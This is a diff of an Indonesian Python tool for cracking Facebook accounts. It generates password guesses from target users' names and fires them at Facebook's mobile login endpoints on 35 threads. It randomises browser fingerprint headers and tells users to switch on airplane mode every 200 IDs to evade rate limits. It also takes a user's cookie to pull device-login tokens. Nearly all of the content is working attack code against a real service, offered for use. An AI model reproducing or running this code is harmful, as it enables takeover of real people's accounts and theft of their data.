@@ -17,10 +17,11 @@ except ImportError:
     print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n")
     os.system("pip install rich")
 
-import requests, sys, time, re, random, base64, json, uuid, struct, binascii
+import requests, sys, time, re, random, base64, json, uuid
 from concurrent.futures import ThreadPoolExecutor as Modol
 from rich.progress import Progress, TextColumn
 from bs4 import BeautifulSoup as par
+from time import time as digidaw
 from rich import print as prints
 from rich.panel import Panel
 from rich.tree import Tree
@@ -82,7 +83,6 @@ class Login:
         print("-----------------------------------------------------------")
         cok = input("[?] cookie : ");self.ubah_bahasa({"cookie": cok})
         try:
-            data, data2 = {}, {}
             link = self.ses.post("https://graph.facebook.com/v2.6/device/login/", data={"access_token": "1348564698517390|007c0a9101b9e1c8ffab727666805038", "scope": ""}).json()
             kode = link["code"];user = link["user_code"]; data, data2 = {}, {}
             vers = par(self.ses.get(f"{self.url}/device?user_code={user}", cookies={"cookie": cok}).text, "html.parser")
@@ -417,7 +417,6 @@ PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
                         exit("\n\ncracking done!")
                 else:continue
 
-
     def carckk(self, kntd):
         self.apk()
         print("""-----------------------------------------------------
@@ -430,15 +429,17 @@ PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
             with Modol(max_workers=35) as bool:
                 for user in self.xz:
                     uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
-                    depan = nama.split(" ")[0]
+                    depan = nama.split(" ")
                     try:
                         if len(nama) <=5:
                             if len(depan) <=1 or len(depan) <=2:pass
-                            else:pwx = [nama,depan+"123",nama+"1234",nama+"12345"]
-                        else:pwx = [nama,depan+"123",nama+"1234",nama+"1234"]
-                        if "iya" in self.iya:
-                            for x in self.pasw:
-                                pwx.append(x)
+                            else:
+                                pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
+                        else:
+                            pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345", depan[0]+"321"]
+                        if "ya" in self.iya:
+                            for kontol in self.pwa:
+                                pwx.append(kontol)
                         if "api" in kntd:bool.submit(self.apiiiiii, uid, pwx)
                         elif "acy" in kntd:bool.submit(self.ASync, uid, pwx)
                         elif "dat" in kntd:bool.submit(self.validate, uid, pwx)
@@ -482,7 +483,7 @@ PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
         kadal = Tree("")
         self.ApkKadal(f"{self.url}/settings/apps/tabbed/?tab=inactive", coki)
         if len(self.ka)==0:
-            kadal.add("[bold red]Tidak ada apklikasi aktif yang terkait di akun ini")
+            kadal.add("[bold red]Tidak ada apklikasi Kedaluwarsa yang terkait di akun ini")
         else:
             for apk in self.ka:
                 kadal.add(apk)
@@ -565,47 +566,60 @@ PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
         prog.advance(des)
         for password in pasw:
             try:
+                rr = random.randint
+                rc = random.choice
                 #user, pasa = "100089133853100|putrabroiler".split("|")
+                uas = self.ua_asu()
                 ses = requests.Session()
-                url = "m.facebook.com"
-                bahasa = random.choice(["en-US,en;q=0.9","en-GB,en;q=0.9","es-LA,es;q=0.9"])
-                leag = random.choice(["id_ID","hi_IN","en_US","jv_ID","en_GB"])
-                link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=2099441543493930&kid_directed_site=0&app_id=2099441543493930&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D2099441543493930%26cbt%3D1693466972390%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df263885d940389%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%26client_id%3D2099441543493930%26display%3Dtouch%26domain%3Daccount.hoyoverse.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252F%2523%252Flogin%253Fcb_route%253D%25252Faccount%25252FaccountInfo%26locale%3Did_ID%26logger_id%3Df24ea8b6c2199ac%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df348efd0f31f7e8%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%2526frame%253Df506dad7e5f0a4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv11.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df348efd0f31f7e8%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff33e116a09cb6c8%26relation%3Dopener%26frame%3Df506dad7e5f0a4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale={leag}&pl_dbl=0&refsrc=deprecated&_rdr")
-                date = {
-				"lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
-				"jazoest": re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
-				"m_ts": re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
-				"li": re.search('name="li" value="(.*?)"',str(link.text)).group(1),
-				"try_number": re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
-				"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
-				'email': username,
-				'pass': password,
-				'prefill_contact_point': username,
-				'prefill_source': 'browser_dropdown',
-				'prefill_type': 'password',
-				'first_prefill_source': 'browser_dropdown',
-				'first_prefill_type':'contact_point',
-				'had_cp_prefilled':'true',
-				'had_password_prefilled': 'true',
-				'is_smart_lock': 'true',
-				'bi_xrwh':'0'}
-                head = {
-				"accept" : "*/*",
-				"accept-encoding" : "gzip, deflate",
-				"accept-language" : bahasa,
-				"cache-control" : "max-age=0",
-				"content-length" : f"{len(str(date))}",
-				"content-type" : "application/x-www-form-urlencoded",
-				"origin" : url,
-				"referer" :link.url,
-				"sec-ch-ua" : '"Not:A-Brand";v="99", "Chromium";v="112"',
-				"sec-ch-ua-mobile" : "?1",
-				"sec-ch-ua-platform" : '"Android"',
-				"sec-fetch-site" : "same-origin",
-				"sec-fetch-user" : "?1",
-				"upgrade-insecure-requests" : "1",
-				"user-agent" : "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"}
-                post = ses.post(f"https://{url}/login/device-based/login/async/?api_key=2099441543493930&auth_token=ed9cb45a485f81810505130bc83f37bb&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D2099441543493930%26cbt%3D1693466972390%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df263885d940389%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%26client_id%3D2099441543493930%26display%3Dtouch%26domain%3Daccount.hoyoverse.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252F%2523%252Flogin%253Fcb_route%253D%25252Faccount%25252FaccountInfo%26locale%3Did_ID%26logger_id%3Df24ea8b6c2199ac%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df348efd0f31f7e8%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%2526frame%253Df506dad7e5f0a4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv11.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=2099441543493930&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df348efd0f31f7e8%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff33e116a09cb6c8%26relation%3Dopener%26frame%3Df506dad7e5f0a4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100", headers=head, data=date, allow_redirects=False)
+                request = rc(['XMLHttpRequest','com.android.chrome','mark.via.gp','com.mi.globalbrowser.mini','dassem.websiteanalyzer'])
+                tema = rc(['dark','light'])
+                bahasa = rc(['en-GB,en-US;q=0.9,en;q=0.8','id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','en-US;q=0.8,en;q=0.7','id,en-US;q=0.9,en;q=0.8','en-US;q=0.8,en;q=0.7'])
+                link = ses.get("https://p.facebook.com/login.php?skip_api_login=1&api_key=635765408705643&kid_directed_site=0&app_id=635765408705643&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fscope%3Demail%26state%3DGEFvooOzOiUasqx99OFaiIbPlm1bqThLdSKXqrSlw1I.8WMomiAInQI.BNnRkmieQ5WfzY_ap22MGQ%26response_type%3Dcode%26client_id%3D635765408705643%26redirect_uri%3Dhttps%253A%252F%252Fidp.azerionconnect.com%252Fauth%252Frealms%252Fspil%252Fbroker%252Ffacebook%252Fendpoint%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2c491088-8a6d-47d2-9ccc-77352a0fc161%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fidp.azerionconnect.com%2Fauth%2Frealms%2Fspil%2Fbroker%2Ffacebook%2Fendpoint%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGEFvooOzOiUasqx99OFaiIbPlm1bqThLdSKXqrSlw1I.8WMomiAInQI.BNnRkmieQ5WfzY_ap22MGQ%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
+                data = {
+                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
+                    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
+                    "try_number": "0",
+                    "unrecognized_tries": "0",
+                    "email": username,
+                    "prefill_contact_point": f"{username} {password}",
+                    "prefill_source": "browser_dropdown",
+                    "prefill_type": "password",
+                    "first_prefill_source": "browser_dropdown",
+                    "first_prefill_type": "contact_point",
+                    "had_cp_prefilled": True,
+                    "had_password_prefilled": True,
+                    "is_smart_lock": False,
+                    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
+                    "bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
+                    "encpass": f"#PWD_BROWSER:0:{str(digidaw()).split('.')[0]}:{password}",
+                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
+                    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)}
+                headers = {
+                    'Host': 'p.facebook.com',
+                    'content-length': f'{str(len(data))}',
+                    'sec-ch-ua': f'"Chromium";v="{str(rr(89,116))}", "Not)A;Brand";v="{str(rr(24,98))}", "Google Chrome";v="116"',
+                    'sec-ch-ua-mobile': '?1',
+                    'user-agent': uas,
+                    'x-response-format': 'JSONStream',
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
+                    'viewport-width': f'{str(rr(50,5000))}',
+                    'sec-ch-ua-platform-version': f'"{str(rr(7,13))}.1.1"',
+                    'x-requested-with': request,
+                    'x-asbd-id': f'{str(rr(129477,2000000))}',
+                    'dpr': '1.5',
+                    'sec-ch-ua-full-version-list': f'"Chromium";v="{str(rr(116,3000))}.0.{str(rr(5845,60000))}.{str(rr(50,3000))}", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="{str(rr(116,3000))}.0.{str(rr(5845,60000))}.{str(rr(50,3000))}"',
+                    'sec-ch-prefers-color-scheme': tema,
+                    'sec-ch-ua-platform': '"Android"',
+                    'accept': '*/*',
+                    'origin': 'https://p.facebook.com',
+                    'sec-fetch-site': 'same-origin',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-dest': 'empty',
+                    'referer': 'https://p.facebook.com/login.php?skip_api_login=1&api_key=635765408705643&kid_directed_site=0&app_id=635765408705643&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fscope%3Demail%26state%3DGEFvooOzOiUasqx99OFaiIbPlm1bqThLdSKXqrSlw1I.8WMomiAInQI.BNnRkmieQ5WfzY_ap22MGQ%26response_type%3Dcode%26client_id%3D635765408705643%26redirect_uri%3Dhttps%253A%252F%252Fidp.azerionconnect.com%252Fauth%252Frealms%252Fspil%252Fbroker%252Ffacebook%252Fendpoint%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2c491088-8a6d-47d2-9ccc-77352a0fc161%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fidp.azerionconnect.com%2Fauth%2Frealms%2Fspil%2Fbroker%2Ffacebook%2Fendpoint%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGEFvooOzOiUasqx99OFaiIbPlm1bqThLdSKXqrSlw1I.8WMomiAInQI.BNnRkmieQ5WfzY_ap22MGQ%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
+                    'accept-encoding': 'gzip, deflate, br',
+                    'accept-language': bahasa}
+                post = ses.post("https://p.facebook.com/login/device-based/login/async/?api_key=635765408705643&auth_token=3f4035c79708a5d0feef878c0ec25ca8&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fscope%3Demail%26state%3DGEFvooOzOiUasqx99OFaiIbPlm1bqThLdSKXqrSlw1I.8WMomiAInQI.BNnRkmieQ5WfzY_ap22MGQ%26response_type%3Dcode%26client_id%3D635765408705643%26redirect_uri%3Dhttps%253A%252F%252Fidp.azerionconnect.com%252Fauth%252Frealms%252Fspil%252Fbroker%252Ffacebook%252Fendpoint%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2c491088-8a6d-47d2-9ccc-77352a0fc161%26tp%3Dunspecified&refsrc=deprecated&app_id=635765408705643&cancel=https%3A%2F%2Fidp.azerionconnect.com%2Fauth%2Frealms%2Fspil%2Fbroker%2Ffacebook%2Fendpoint%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGEFvooOzOiUasqx99OFaiIbPlm1bqThLdSKXqrSlw1I.8WMomiAInQI.BNnRkmieQ5WfzY_ap22MGQ%23_%3D_&lwv=100",data= data, headers= headers, allow_redirects=False)
 
                 if "c_user" in ses.cookies.get_dict():
                     cooz = ses.cookies.get_dict()
